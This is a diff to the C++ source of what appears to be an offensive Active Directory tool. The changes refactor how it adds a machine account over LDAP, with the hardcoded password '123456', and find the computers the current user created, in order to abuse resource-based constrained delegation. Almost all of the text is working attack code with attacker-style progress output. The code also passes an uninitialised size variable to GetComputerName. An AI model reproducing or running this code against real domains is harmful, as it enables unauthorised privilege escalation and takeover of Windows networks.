@@ -308,17 +308,28 @@ vector<string> LDAP_API::getObjectSid(string pcName){
 
 string LDAP_API::getComputerDn(){
 	PCHAR pAttributes[] = { "distinguishedName", NULL };
-	TCHAR szBufferComputerName[MAX_PATH] = { 0 };
-	DWORD dwSize;
-	GetComputerName(szBufferComputerName, &dwSize);
+
+	TCHAR szBufferComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
+	DWORD dwComputerSize;
+	GetComputerName(szBufferComputerName, &dwComputerSize);
+	
 	string grammarString = "(sAMAccountName=" + string(szBufferComputerName) + "$)";
 	vector<string> vString = this->search(grammarString.c_str(), this->baseDn, pAttributes);
 	return vString[0];
 }
 
-string LDAP_API::addComputer(string pcName, string dn){
-	LDAPMod m1, m2, m3, m4, m5, m6;
+string LDAP_API::addComputer(string pcName){
+	DWORD dwComputerSize;
+	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
+	GetComputerName(currentComputerName, &dwComputerSize);
 
+	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
+	regex matchString(currentComputerName);
+
+	string computerDnString = this->getComputerDn();
+	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
+	string addComputerDnString = regex_replace(computerDnString, matchString, pcName, fonly);
+	LDAPMod m1, m2, m3, m4, m5, m6;
 	string dnsHostNameString = pcName + "." + this->domainName;
 	TCHAR* dnsHostNameVals[] = { (TCHAR*)dnsHostNameString.c_str(), NULL };
 	m1.mod_op = LDAP_MOD_ADD;
@@ -368,8 +379,7 @@ string LDAP_API::addComputer(string pcName, string dn){
 	//string userSid = this->getCurrentUserSid();
 	//MACHINE_ACCOUNT_ATTRIBUTE machineAccountAttribute;
 	
-	
-	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, (PSTR)dn.c_str(), pModAttrs, NULL, NULL);
+	DWORD dwRet = ldap_add_ext_s(this->pLdapInstance, (PSTR)addComputerDnString.c_str(), pModAttrs, NULL, NULL);
 	if (dwRet == LDAP_SUCCESS){
 		cout << "[+] LDAP::addComputer Add Successed, Password is 123456" << endl;
 		delete bv.bv_val;
@@ -406,28 +416,28 @@ void LDAP_API::addDnsRecord(string dnsName, string ipName){
 
 // https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/ 思路来源
 void LDAP_API::updateResourceBasedConstrainedDelegation(string pcName){
-	string currentUserCreatorSid = this->getCurrentUserSid();
+	string currentUserCreatorSid = this->getCurrentUserSid(this->domainName);
 	cout << "[+] CurrentCreatorSid ----> "  << currentUserCreatorSid << endl;
 	
-	vector<string> vCnString;
 	// 找到当前mS-DS-CreatorSID为当前用户的CN
+	vector<string> vCnString;
 	string fmtCreatorSid = "(mS-DS-CreatorSID=" + currentUserCreatorSid + ")";
 	PCHAR pAttributes[] = { "cn", NULL };
 	cout << "[+] Checking " << fmtCreatorSid << endl;
+	
+	// 当前CreatorSid的所有机器名称
 	vCnString = this->search(fmtCreatorSid, this->baseDn, pAttributes);
-
+	
+	wstring addComputerSidString = string2Wstring(addComputer(pcName));
+	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
+	
 	DWORD dwComputerSize;
-	TCHAR currentComputerName[MAX_PATH] = { 0 };
+	TCHAR currentComputerName[MAX_COMPUTERNAME_LENGTH+1] = { 0 };
 	GetComputerName(currentComputerName, &dwComputerSize);
 	regex_constants::match_flag_type fonly = regex_constants::format_first_only;
 	regex matchString(currentComputerName);
-
 	string computerDnString = this->getComputerDn();
-	cout << "[+] Getting computerDn ----> " << computerDnString << endl;
-	string addComputerDn = regex_replace(computerDnString, matchString, pcName);
-	wstring addComputerSidString = string2Wstring(addComputer(pcName, addComputerDn));
-	//wstring addComputerSidString = L"S-1-5-21-4223269421-3390898629-3395902804-1132"; // 新添加机器的objectSid
-	
+
 	if (!vCnString.empty()){
 		// 遍历取出可以基于资源委派的机器名
 		// 对所有可以进行资源委派的机器名设置对应的字段msDS-AllowedToActOnBehalfOfOtherIdentity为当前的用户SID
